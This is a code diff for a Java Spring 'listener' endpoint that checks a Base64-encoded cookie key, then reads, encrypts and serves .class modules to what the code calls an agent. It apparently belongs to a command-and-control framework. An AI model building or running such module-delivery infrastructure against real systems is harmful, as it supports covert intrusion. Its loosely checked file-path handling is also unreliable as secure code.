@@ -217,9 +217,10 @@ public class ListenerApplication {
 		//String log(@RequestBody noceboApiRequest requestData, @CookieValue("nocebo.auth") String authCookie)
 		ResponseEntity<String> download(@CookieValue("__Secure-YEC") String apiKeyData, @RequestParam("v") String classNameEncoded) throws Exception, IOException, NoSuchAlgorithmException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
 		{
-			if (!apiKeyData.equals(epc.apiKey))
+			String apiKeyDecoded = new String(Base64.getDecoder().decode(apiKeyData));
+			if (!apiKeyDecoded.equals(epc.apiKey))
 			{
-				return new ResponseEntity<String>("error.0x73657373",null,HttpStatus.CREATED);
+				return new ResponseEntity<String>("error.0x73657373",null,HttpStatus.FORBIDDEN);
 			}
 
 			String classNameDecoded = new String(
@@ -228,10 +229,6 @@ public class ListenerApplication {
 				)
 			);
 
-			String modPath = String.format("..%sfileroot%scom%snocebo%snCore%s%s.class",File.separator,File.separator,File.separator,File.separator,File.separator,classNameDecoded);
-			byte[] fileData = Files.readAllBytes(Paths.get(modPath));
-
-			String modData = new String(Base64.getEncoder().encode(fileData));
 			//use .substring(0,12).replace("-",""); on agent
 			String downloadNonce = String.join(
 				"-", 
@@ -244,6 +241,20 @@ public class ListenerApplication {
 				}
 			);
 
+			HttpHeaders respHeaders = new HttpHeaders();
+    		respHeaders.set("uuid", downloadNonce);
+
+			byte[] fileData = new byte[]{};
+			String modPath = String.format("..%sfileroot%s%s.class",File.separator,File.separator,classNameDecoded.replace(".",File.separator));
+			if (new File(modPath).isFile())
+			{
+				fileData = Files.readAllBytes(Paths.get(modPath));
+			}
+			else
+			{
+				return new ResponseEntity<String>("error.0x66696C65",respHeaders,HttpStatus.OK);
+			}
+
 			String retrData = new String(
 				Base64.getEncoder().encode(
 					sapi.encrypt(
@@ -255,9 +266,7 @@ public class ListenerApplication {
 			);
 
 			
-			HttpHeaders respHeaders = new HttpHeaders();
-    		respHeaders.set("uuid", downloadNonce);
-    		return new ResponseEntity<String>(retrData, respHeaders, HttpStatus.CREATED);
+    		return new ResponseEntity<String>(retrData, respHeaders, HttpStatus.OK);
 
 		}
 
